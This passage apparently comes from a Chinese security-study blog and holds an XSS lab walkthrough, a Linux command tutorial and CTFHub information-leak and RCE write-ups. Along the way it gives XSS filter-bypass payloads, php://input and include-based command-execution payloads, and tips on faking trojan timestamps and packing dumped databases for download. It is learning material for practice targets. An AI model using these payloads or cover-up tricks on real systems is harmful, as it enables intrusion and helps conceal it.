src="xss%E9%9D%B6%E5%9C%BA/image-20230722232132664.png" alt="image-20230722232132664">                     </p><p>我们试一下双写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascript:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145351825.png" alt="image-20230723145351825"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145226140.png" alt="image-20230723145226140"></p><p>好像script也过滤了，试试双写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascriptipt:alert(1)&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723145624818.png" alt="image-20230723145624818"></p><p>成功！</p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这一关跟第七关相比，<code>&lt;script&gt;</code>被限制了，on事件也限制了</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723150209793.png" alt="image-20230723150209793"></p><blockquote><p><code>href有一个隐藏属性，会自动Unicode解码，可以利用Unicode编码绕过</code></p></blockquote><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723231149808.png" alt="image-20230723231149808"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230723231249977.png" alt="image-20230723231249977"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>先输入上一道题的payload，会提示链接不合法。</p><p>看看里面源码，显示</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724215148579.png" alt="image-20230724215148579"></p><p>strops()函数返回字符串在另一关字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false。<code>函数对大小写敏感，用这个函数来判断字符串是否存在某个字符时必须使用===false</code></p><p>= 用于比较 判断 两者相等  ==在比较的时候可以自动换成数据类型</p><p>===用于严格比较 判断两者严格相等，严格比较不会进行自动转换，要求进行比较的操作数必须类型一致，不一致时返回flase</p><p>==值相等  ， ===值和类型相同</p><p>所以当我们输入第八关的payload时，该字符串没有包含题目的<code>http://</code>字符串，返回false，===比较值和类型，所以会打印<code>您的链接不合法</code>，</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725102329283.png" alt="image-20230725102329283"></p><p>我们想让伪协议和http://共存，可以把http注释掉，之所以不会出错是因为http://是个必须出现的字符，这个不是重要的字符，只要出现，并且不让后台读取就可以了</p><p>构造的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029  //http://</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725104741241.png" alt="image-20230725104741241"></p><h2 id="level-10-隐藏表单字段注入"><a href="#level-10-隐藏表单字段注入" class="headerlink" title="level-10(隐藏表单字段注入)"></a>level-10(隐藏表单字段注入)</h2><p>查看源码，发现表单中的type属性值都是hidden（隐藏）</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724231311117.png" alt="image-20230724231311117"></p><p>我们可以尝试构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_link=222&amp;t_history=55&amp;t_sort=123</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725215159398.png" alt="image-20230725215159398"></p><p>看源码显示，只有t_sort显示出来，可以推出t_sort是xss的攻击点</p><p>先闭合引号和尖括号的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725220314548.png" alt="image-20230725220314548"></p><p>发现尖括号被过滤了，但是要实现xss还是要让type的hidden失效</p><p>怎么办呢？</p><blockquote><p>看到我们的xss攻击点在<code>type=&quot;hidden&quot;</code>前面，</p><p>所以考虑用html中的谁在前，谁优先的原则，</p><p>在其前面提前定义一个<code>type=&quot;text&quot;</code></p><p>使得<code>type=&quot;hidden&quot;</code>无效化，从而实现xss的目的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=&quot;onclick=&#x27;alert(1)&#x27;  type=&#x27;text&#x27;</span><br></pre></td></tr></table></figure><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725221100590.png" alt="image-20230725221100590"></p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230725221235637.png" alt="image-20230725221235637"></p><p>看网站源码，</p><p>发现网站读取两个可控参数，keyword，t_sort</p><p>猜测xss攻击点在其中一个</p><p>但是keyword的$str被htmlspecialchars给转义了，所以无法实现xss</p><p>所以也可以推出t_sort才是xss攻击点，而且其赋值参数$str11只过滤了&lt;&gt;，然后直接插入页面中，从而推导出payload</p><p><img src="xss%E9%9D%B6%E5%9C%BA/image-20230724235700474.png" alt="image-20230724235700474"></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2></script></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>Linux命令是用于实现某一类功能的指令或者程序，其命令的执行依赖于解释器程序，如bin/bash。</p><p><code>内部命令：安装系统能执行的命令，shell解析器部分，比如ls、cat、cd。</code></p><p><code>外部命令：安装web应用程序的命令，大部分时对安装程序进行操作的。</code></p><h3 id="Linux命令的通用格式为："><a href="#Linux命令的通用格式为：" class="headerlink" title="Linux命令的通用格式为："></a>Linux命令的通用格式为：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">命令关键字[选项] [参数]</span><br><span class="line">选项及参数含义：</span><br><span class="line">   -选项：用于调节命令的具体功能</span><br><span class="line">   -以“-”引导短格式选项（单个字符），比如“-l”</span><br><span class="line">   -以“--”引导长格式选项（多个字符），比如“--color”</span><br><span class="line">   -多个段格式选项可以写在一起，用一个“-”引导，比如“-al”</span><br><span class="line">参数：命令操作的对象，如文件、目录名等</span><br></pre></td></tr></table></figure><p>举例子，<code>ls -al /home</code>查看home目录信息。</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715152508816.png" alt="image-20230715152508816"></p><h3 id="Linux命令行编辑的几个辅助操作包括："><a href="#Linux命令行编辑的几个辅助操作包括：" class="headerlink" title="Linux命令行编辑的几个辅助操作包括："></a>Linux命令行编辑的几个辅助操作包括：</h3><p>tab键：自动补全</p><p>反斜杠“ \”:强制换行</p><p>快捷键ctrl + U：清空至行首</p><p>快捷键ctrl + K ：清空至行尾</p><p>快捷键ctrl + L ：清屏，类似于clear</p><p>快捷键ctrl + C：取消本次命令编辑，强制中断程序的执行</p><p>快捷键ctrl + Z ：强制中断任务</p><h3 id="常见的Linux命令"><a href="#常见的Linux命令" class="headerlink" title="常见的Linux命令"></a>常见的Linux命令</h3><h4 id="命令：help"><a href="#命令：help" class="headerlink" title="命令：help"></a>命令：help</h4><p>Linux内部帮助命令是help，其基本使用方法如下：</p><ul><li>help</li></ul><p>查看Bash内部命令的帮助信息</p><ul><li>命令 –help</li></ul><p>查看外部命令帮助信息，适合大多数外部命令</p><ul><li>使用man命令阅读手册页</li></ul><p>使用“↑”、“↓”方向键滚动文本，使用Page Up和Page Down键翻页，按Q或q键退出阅读环境，按“/”键后查看内容</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155028075.png" alt="image-20230715155028075"></p><h4 id="命令：uname"><a href="#命令：uname" class="headerlink" title="命令：uname"></a>命令：uname</h4><p>查看系统相关信息，常见命令选项：</p><p>-a ：显示主机名、内核版本、硬件平台等详细信息</p><p>-r ： 显示内核版本号</p><p><code>提权中可能会碰到uname命令。提权一般基于内核的本地溢出提权，如果想本地溢出，首先需要看到本地版本号</code></p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715155950449.png" alt="image-20230715155950449"></p><h4 id="命令：hostname"><a href="#命令：hostname" class="headerlink" title="命令：hostname"></a>命令：hostname</h4><p>查看系统主机名，包括主机名称，所在域的名称</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160722996.png" alt="image-20230715160722996"></p><h4 id="命令：ifconfig"><a href="#命令：ifconfig" class="headerlink" title="命令：ifconfig"></a><strong>命令：ifconfig</strong></h4><p>查看系统IP信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715160820826.png" alt="image-20230715160820826"></p><h4 id="命令：cat-proc-cpuinfo"><a href="#命令：cat-proc-cpuinfo" class="headerlink" title="命令：cat  /proc/cpuinfo"></a>命令：<strong>cat  /proc/cpuinfo</strong></h4><p>查看CPU信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161430568.png" alt="image-20230715161430568"></p><h4 id="命令：cat-proc-meminfo"><a href="#命令：cat-proc-meminfo" class="headerlink" title="命令：cat  /proc/meminfo"></a>命令：cat  /proc/meminfo</h4><p>查看内存信息</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715161559159.png" alt="image-20230715161559159"></p><h3 id="目录操作命令-ls-cd-du-mkdir"><a href="#目录操作命令-ls-cd-du-mkdir" class="headerlink" title="目录操作命令 ls/cd/du/mkdir"></a>目录操作命令 ls/cd/du/mkdir</h3><h4 id="命令：pwd"><a href="#命令：pwd" class="headerlink" title="命令：pwd"></a>命令：pwd</h4><p>查看目录工具</p><h4 id="命令：cd"><a href="#命令：cd" class="headerlink" title="命令：cd"></a>命令：cd</h4><p>切换工作目录，其格式为：cd [目录位置]</p><p>相对路径</p><p>绝对路径</p><h4 id="命令：ls"><a href="#命令：ls" class="headerlink" title="命令：ls"></a>命令：ls</h4><p>用途：列表显示目录内容</p><p>ls [目录或文件名]</p><ul><li>-l：以长格式显示</li><li>-a：显示所有子目录和文件的信息，包括隐藏文件</li><li>-A：类似于“-a”，但不显示“.”和“…”目录的信息</li><li>-d：显示目录本身的属性</li><li>-h：以更易读的字节单位（K、M等）显示信息</li><li>-R：递归显示内容</li><li>–color：以颜色区分不同类型文件</li></ul><h4 id="常用组合：ls-al"><a href="#常用组合：ls-al" class="headerlink" title="常用组合：ls -al"></a>常用组合：ls -al</h4><p>在Linux系统中，ls相当于DOS命令中的dir，Linux的隐藏文件前面有个点“ .test” ,具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">查看当前目录</span><br><span class="line">ls /</span><br><span class="line">查看根目录或者文件</span><br><span class="line">ls -al</span><br><span class="line">查看文件所有信息，包括隐藏文件，并以长格式显示</span><br><span class="line">ls -lh /</span><br><span class="line">查看文件大小，以长格式显示</span><br></pre></td></tr></table></figure><p>在web渗透中，我们常用“ls  -al”命令查看文件的权限信息。</p><h4 id="命令：du"><a href="#命令：du" class="headerlink" title="命令：du"></a>命令：du</h4><p>用途：主要用于查看文件大小，统计目录及文件的空间占用情况（Eatimate file space usage）。</p><p>格式：du [选项]… [目录或文件名]</p><p>常用格式选项：</p><ul><li>-a：统计时包括所有的文件，而不仅仅只统计目录</li><li>-h：以更易读的字节单位（K、M等）显示信息</li><li>-s：只统计每个参数所占用空间总的大小</li></ul><h5 id="常用组合：du-sh"><a href="#常用组合：du-sh" class="headerlink" title="常用组合：du -sh"></a>常用组合：du -sh</h5><p>当我们拿到服务器之后，需要对源码进行打包或数据库进行脱库，如果库太大，Sqlmap可能会跑崩，可以尝试du查看大小“du -sh /”，再用“gzip”压缩打包下载</p><h4 id="命令：mkdir"><a href="#命令：mkdir" class="headerlink" title="命令：mkdir"></a>命令：mkdir</h4><p>用途：常见命令，用于创建新的目录</p><p>格式：mkdir [-p] [/路径]目录名</p><p>常用命令：递归创建目录mkdir -p /csdn/eastmount</p><p>当我们调用“mkdir  /cdsn/eastmount ”时会报错，因为跟目录下没有“csdn”目录。如果想要连续递归创建多个目录，则需要增加“-p”参数，即“mkdir -p</p><p>/csdn/eastmount”</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225441390.png" alt="image-20230715225441390"></p><p>如果想要连续创建两个目录，则使用如下方法：</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715225556094.png" alt="image-20230715225556094"></p><h3 id="文件操作命令touch-vim-cp-rm-mv-find"><a href="#文件操作命令touch-vim-cp-rm-mv-find" class="headerlink" title="文件操作命令touch/vim/cp/rm/mv/find"></a>文件操作命令touch/vim/cp/rm/mv/find</h3><h4 id="命令：touch"><a href="#命令：touch" class="headerlink" title="命令：touch"></a>命令：touch</h4><p>用途：新建空文件，或更新文件时间标记</p><p>格式：touch 文件名</p><p>如果文件不存在则创建文件；如果文件存在，该命令的另一个作用是更新日期。在web渗透中，该命令可以硬核的帮助我们创建文件或隐藏东西。比如我们上传了一个木马，它会有相应的新建日期，管理员很容易发现这些异常文件或信息。我们可以尝试将所有文件都更新到最新日期，调用“touch /var/www/html/*”命令实现，但其效果肯定不好，后面随着深入，会分享更好的方法</p><p>   <img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231549659.png" alt="image-20230715231549659">        </p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230715231810225.png" alt="image-20230715231810225"></p><h4 id="命令：ln"><a href="#命令：ln" class="headerlink" title="命令：ln"></a>命令：ln</h4><p>用途：为文件或目录创建链接，即快捷方式</p><p>格式：ln [-s]源文件或目录..链接文件或目标目录</p><p>常用格式选项：</p><p>-s：建立符号链接文件</p><h4 id="命令：cp"><a href="#命令：cp" class="headerlink" title="命令：cp"></a>命令：cp</h4><p>用途：复制文件或目录</p><p>格式：cp [选项] …源文件目录或目录  目录文件或目标目录</p><p>常用格式选项：</p><p>-r：递归复制整个目录树</p><p>-p：保持源文件的属性不变</p><p>-f：强制覆盖目标同名文件或目录,根目录是略过目录时使用。</p><p>-i：需要覆盖文件或目录时进行提醒</p><p>复制文件至指定位置：cp test.txt/var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111138655.png" alt="image-20230716111138655"></p><p>如果我们需要复制目录的话，需要增加一个递归复制参数“-r” ，比如： cp -r cdsn /var/www/html/</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716111950239.png" alt="image-20230716111950239"></p><h4 id="命令：rm"><a href="#命令：rm" class="headerlink" title="命令：rm"></a>命令：rm</h4><p>用途：删除文件或目录</p><p>格式：rm [选项] .. 文件或目录</p><p>常用格式选项：</p><p>-f：强制删除文件或目录，不进行提醒</p><p>-i：删除文件或目录时提醒用户确认</p><p>-r: 递归删除整个目录树</p><p>常用命令：递归强制删除整个目录rm-rf，但需慎用</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716113119175.png" alt="image-20230716113119175"></p><h4 id="命令：mv"><a href="#命令：mv" class="headerlink" title="命令：mv"></a>命令：mv</h4><p>用途：移动文件或目录，相当于剪切，如果目标位置与源位置相同，相当于重命名</p><p>格式：mv [选项] …源文件或目录  目标文件或目录</p><p>移动至“csdn”文件夹，如：mv  yl.txt/csdn</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716133231434.png" alt="image-20230716133231434"></p><p>重命名文件，如：mv  yl.txt  test.txt</p><h4 id="命令：find"><a href="#命令：find" class="headerlink" title="命令：find"></a>命令：find</h4><p>用途：用于查找文件或目录，取证也常用该命令</p><p>格式：find [查找范围] [查找条件]</p><p>常用格式选项：</p><p>-name: 按文件名称查找</p><p>-size：按文件大小查找</p><p> -user：按文件属性查找</p><p>-type：按文件类型查找</p><p>通过名字查某目录下所有文件，如：<code>find  /etc -name  &quot;m*.conf&quot;</code>,注意“*”表示通配符</p><p><img src="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/image-20230716231407108.png" alt="image-20230716231407108"></p><p>查找网站根目录下哪些文件是root，如：find / -user root</p><p>在Web渗透中，当某人上传文件并修改为root权限，我们管理员可以通过该命令查找来发现可疑文件，判断服务器是否被攻击。</p><p>4.文本编辑查看命令vim/cat/wc</p><p>命令：vi</p><p>用途：该命令是一个较大的UNIX命令</p>]]></content>
      
      
      <categories>
          
          <category> 命令学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub</title>
      <link href="/2023/07/15/ctfhub/"/>
      <url>/2023/07/15/ctfhub/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>1.有两层目录，一个一个试，一共有4*4种尝试方式，找到flag.txt</p><p><img src="/2023/07/15/ctfhub/image-20230713092337772.png" alt="image-20230713092337772"></p><p>2.用python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 访问目录遍历，/1/1,/1/2，，，/4/4，读取响应有无flag.txt，有则输出目录路径</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge-df1916128f6a845f.sandbox.ctfhub.com:10800/flag_in_here/&quot;</span><br><span class="line">for i in range(1, 5):</span><br><span class="line">    for j in range(1, 5):</span><br><span class="line">        url1 = url + str(i) + &quot;/&quot; + str(j) + &quot;/flag.txt&quot;</span><br><span class="line">        # 读取响应页面中有无flag.txt，有则打印url</span><br><span class="line">        if &quot;ctfhub&#123;&quot; in requests.get(url1).text:</span><br><span class="line">            #直接打出flag.txt的内容</span><br><span class="line">            print(requests.get(url1).text)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p><code>ctrl+F 查找关键字flag</code></p><p><img src="/2023/07/15/ctfhub/image-20230713161017017.png" alt="image-20230713161017017"></p><h2 id="备份文件下载-网站源码"><a href="#备份文件下载-网站源码" class="headerlink" title="备份文件下载-网站源码"></a>备份文件下载-网站源码</h2><p><img src="/2023/07/15/ctfhub/image-20230713161337694.png" alt="image-20230713161337694"></p><h3 id><a href="#" class="headerlink" title></a></h3><p>常见的一些网站源码下载文件后缀和文件名。</p><p>1.使用dirsearsh扫描</p><p>2.访问<a href="http://www.zip文件/">www.zip文件</a></p><p><img src="/2023/07/15/ctfhub/image-20230713164646825.png" alt="image-20230713164646825"></p><p>打开记事本，发现</p><p><img src="/2023/07/15/ctfhub/image-20230713164750008.png" alt="image-20230713164750008"></p><p>尝试再网站上访问，得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230713165051679.png" alt="image-20230713165051679"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>1.根据提示访问index.php.bak文件</p><p><img src="/2023/07/15/ctfhub/image-20230713170128212.png" alt="image-20230713170128212"></p><p>下载并查看</p><p><img src="/2023/07/15/ctfhub/image-20230713170638785.png" alt="image-20230713170638785"></p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>原理：在开发人员使用‘vim编辑器’编辑文本时，系统会自动生成一个备份文件，当编辑完成后，保存时，元文件会更新，备份文件会被自动删除。</p><p>但是当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p><p>以index.php为例</p><p>第一次产生的交换文件名为 <code>.index.php.swp</code></p><p>再次意外退出后，将会产生的交换文件名为 <code>.index.php.swo</code></p><p>第三次产生的交换文件名 <code>.index.php.swn</code></p><p>这些隐藏文件的作用：<code>可用来恢复意外退出文件</code></p><p><code>如何利用</code></p><p><code>swp</code>备份文件就是隐藏文件，操作时需要在文件名前<code>.</code></p><p>针对<code>swp</code>备份文件，可以使用vim -r filename命令来恢复文件</p><p>（<code>vim</code>使用的缓存存储为一种固定的二进制文件。而一般编辑的字符是明文可见字符，在vim的缓存中这些可见字符会原样保留，所以显示出来的是乱码。）</p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title="DS_Store"></a>DS_Store</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问url/.DS_Store</span><br></pre></td></tr></table></figure><p>下载DS_Store文件</p><p>把文件放入Linux里面，cat里面有文件路径</p><h3 id="git-泄露"><a href="#git-泄露" class="headerlink" title="git 泄露"></a>git 泄露</h3><p>log</p><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将<code>.git</code>文件夹直接部署到线上环境。这就引起了git 泄露漏洞。</p><p>GitHack是一个<code>.git</code>泄露利用测试脚本，通过泄露文件，还原重建工程源代码。</p><p>原理：</p><p>1.解析<code>.git/index</code>文件，找到工程中所有的:(文件名，文件)</p><p>2.去<code>.git/objects/</code>文件夹下下载对应的文件</p><p>3.<code>zlib</code>解压文件，按原始的目录结构写入源代码</p><p>优点</p><p>速度快，默认20个工作线程</p><p>尽量还原所有</p><h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>打开靶场环境，看到代码，分析一下，读取请求体的参数cmd，传入eval中当做php代码执行</p><p><img src="/2023/07/15/ctfhub/image-20230819172024259.png" alt="image-20230819172024259"></p><p>尝试一下执行命令，发现当前文件夹是index.php</p><p><img src="/2023/07/15/ctfhub/image-20230819172424118.png" alt="image-20230819172424118"></p><p>查看根目录底下文件</p><p><img src="/2023/07/15/ctfhub/image-20230819172647278.png" alt="image-20230819172647278"></p><p>发现flag_8348,cat一下，得flag</p><p><img src="/2023/07/15/ctfhub/image-20230819172905694.png" alt="image-20230819172905694"></p><p>完成！</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>1.打开文件</p><p><img src="/2023/07/15/ctfhub/image-20230820163300923.png" alt="image-20230820163300923"></p><p>2.发现有个超链接，点击shell看看会出现什么</p><p><img src="/2023/07/15/ctfhub/image-20230820211443735.png" alt="image-20230820211443735"></p><p>3.上个目录没有得到想要的，查看上个目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>include是文件包含，</p><p>include:出现错误时，会出现警告但是程序会继续执行</p><p>file参数包含数shell.txt文件，shell.txt文件里面有rce命令</p><p>执行。</p><p><img src="/2023/07/15/ctfhub/image-20230820220233427.png" alt="image-20230820220233427"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230820220321509.png" alt="image-20230820220321509"></p><p>所以这个题我们可以传两个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt&amp;ctfhub=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2023/07/15/ctfhub/image-20230820220410558.png" alt="image-20230820220410558"></p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>这里先了解一下php://input</p><p>php://用来访问各个输入、输出流</p><p>php://input用来访问请求的原始数据的只读流，可以接收post请</p><p>求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形</p><p>式进行输入的目的</p><p>php代码输入，以达到以post的形式进行输入的目的</p><p>1.开始做题，先看题目</p><p><img src="/2023/07/15/ctfhub/image-20230821145552415.png" alt="image-20230821145552415"></p><p>(1).分析一下代码，传入一个file参数，用于检查<code>$_GET[&#39;file&#39;]</code>是否已设置，<code>$_GET</code>是一个超全局变量，它用于收集来自url参数的数据。<strong>isset函数检查变量是否设置并且不为<code>null</code>。它不会检查变量的值是否为空字符串、空数组或 <code>false</code>。如果您需要检查变量的值是否为空，可以使用 <code>empty</code> 函数。</strong></p><p>(2).<code>if ( substr($_GET[&quot;file&quot;], 0, 6) = = = &quot;php://&quot; )</code>代码用来判断<code>$_GET[&#39;file&#39;]</code>的前6个字符是否为“php://”，如果是它将用include函数包含<code>$_GET[&#39;file&#39;]</code>指定的文件。<code>substr</code>函数用于返回字符串的子串。<code>$_GET[&#39;file&#39;]</code>的前6个字符<code>= = =</code>运算符将与<code>“php://”</code>进行比较，两个相等的话，执行if语句块的代码。</p><p>2.点击phpinfo查看配置</p><blockquote><p>allow_url_fopen=on</p><p>allow_url_include=on</p></blockquote><p><img src="/2023/07/15/ctfhub/image-20230821213333963.png" alt="image-20230821213333963"></p><p>可以用<code>php://input</code>用于<strong>执行php代码</strong>，</p><p><strong>扩展知识</strong></p><blockquote><p>php://input是一个可以访问请求的原始数据的只读流。当请求方式post，并且Content-Type不等于“multipart/from-data”时，可以使用<code>php://input</code>来获取原始请求的数据。</p><p><strong>为什么post传参content-type的类型不multipart/from-data？</strong></p><p>当使用 <code>php://input</code> 读取 POST 请求的原始数据Content-Type 的类型不能是 <code>multipart/form-data</code>。这是因为 <code>php://input</code> 只能用于读取非文件上传的 POST 数据，当表单中包含文件上传时，应该使<code>enctype=&quot;multipart/form-data&quot;</code>，并通过 <code>$_FILES</code> <code>超全局变量</code>来访问上传的文件。</p><p><strong>为什么post传参content-type的类型不能是multipart/from-data？</strong></p><p>当使用 <code>php://input</code> 读取 POST 请求的原始数据时，Content-Type 的类型不能是 <code>multipart/form-data</code>。这是因为 <code>php://input</code> 只能用于读取非文件上传的 POST 数据。当表单中包含文件上传时，应该使用<code>enctype=&quot;multipart/form-data&quot;</code>，并通过 <code>$_FILES</code> 超全局变量来访问上传的文件。</p></blockquote><blockquote><p><strong>超全局变量：</strong></p><p>超全局变量在一个脚本的全部作用域中都可用，在函数或方法中无需执行global $variable,就可以访问它们。</p><p>常见的超全局变量有:<code>$GLOBALS</code>,<code>_SERVER</code>,<code>$_REQUEST</code>,<code>$_POST</code>,<code>_GET</code>,<code>$_FILES</code>,<code>$_ENV</code>,<code>$_COOKIE</code>,<code>_SESSION</code></p></blockquote><p>抓个包看看,把get传参方式为post，目标修改为/?file=php://input</p><p>将上传一句话木马<code>&lt;?php system(&#39;ls /&#39;)?&gt;</code>查看上一级文件，我们发现根目录下有flag_16455</p><p><img src="/2023/07/15/ctfhub/image-20230821145722819.png" alt="image-20230821145722819"></p><p>进入flag_16455查看文件</p><p><code>&lt;?php system(&#39;cat /flag_16455&#39;)?&gt;</code></p><p>得到flag</p><p><img src="/2023/07/15/ctfhub/image-20230821145817919.png" alt="image-20230821145817919"></p><h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>1.查看靶场环境</p><p><img src="/2023/07/15/ctfhub/image-20230823105659962.png" alt="image-20230823105659962"></p><p>解析一下代码</p><p><code>if(isset($_GET[&#39;file&#39;]))</code>如果传入的参数存在，执行下面的语句。</p><blockquote><p><code>if(!strpos($_GET[&quot;file&quot;],&quot;flag&quot;))&#123;</code></p><p><code>   include 